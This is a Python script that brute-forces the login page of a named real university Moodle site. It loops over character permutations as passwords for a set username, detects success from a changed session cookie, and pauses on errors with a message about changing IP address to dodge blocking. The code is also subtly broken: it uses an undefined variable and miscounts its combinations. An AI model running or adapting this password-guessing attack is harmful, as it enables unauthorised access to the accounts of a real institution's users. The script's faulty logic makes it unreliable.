import requests
import itertools
import time
s=requests.Session()
url="https://moodle.niituniversity.in/moodle/login/index.php"
user="username"
res = itertools.permutations('Password',len(password))
combinations=8*8*8*8*8*8*8*8
print("Number of possible combinations : " + str(combinations) + "\n")
r=s.get(url)
session1=r.cookies["MoodleSession"]
count=0
for i in res:
    count+=1
    try:
        pas=''.join(i)
        login_data=dict(username=user,password=pas)
        s.post(url,data=login_data)
        session2=s.cookies["MoodleSession"]
        if session1!=session2:
            print(str(count) + ". PASSWORD: " + pas)
            break
        else:
            print(str(count) + ". "+ pas + " :NOT MATCH")
    except:
        print("\nChanging Ip address\n")
        time.sleep(5)
        
